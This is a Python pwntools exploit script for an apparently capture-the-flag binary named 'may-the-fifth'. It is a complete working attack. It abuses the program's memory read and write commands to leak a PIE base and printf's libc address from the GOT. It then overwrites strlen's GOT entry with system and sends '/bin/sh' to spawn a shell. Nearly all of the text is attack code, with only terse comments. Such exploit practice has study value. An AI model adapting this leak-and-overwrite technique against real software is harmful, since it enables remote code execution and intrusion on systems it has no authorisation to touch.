#!/usr/bin/env python3

from pwn import *

elf = ELF("./may-the-fifth")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 4000)

    return r


r = conn()

#PEEK 143 4 @@ . offset size @@
#POKE 20204 143 3 !! data offset size !!

r.recvline()
read_pie_addr = b"-300 4 @@ ."
r.sendline(read_pie_addr)


pie_leak = int(r.recvline().strip(), 0)

log.info(f'Dict addr {hex(pie_leak)}')

elf.address = pie_leak - 0x61a0 #dict_addr - 

print(hex(elf.address))

printf_got = elf.got['printf']

#offset = printf_got - dict_addr to calculate reading from libc address

read_libc = f"{printf_got-pie_leak} 4 @@ ." #read from printf got -> gain printf libc address

print(read_libc)

r.sendline(read_libc.encode())



leak_libc = int(r.recvline().strip(), 0)


log.info(f'PRINTF LIBC LEAK {hex(leak_libc)}')

libc.address = leak_libc - libc.sym['printf']

one_gadget = libc.address + 0x13dabc

log.info(f'LIBC BASE {hex(libc.address)}')

strlen = elf.got['strlen']

#use POKE to write strlen address with system address

payload = f"{libc.sym['system']} {strlen-pie_leak} 4 !!" 
r.sendline(payload.encode())

#just send /bin/sh and enjoy shell :)
r.sendline(b'/bin/sh')

r.interactive()

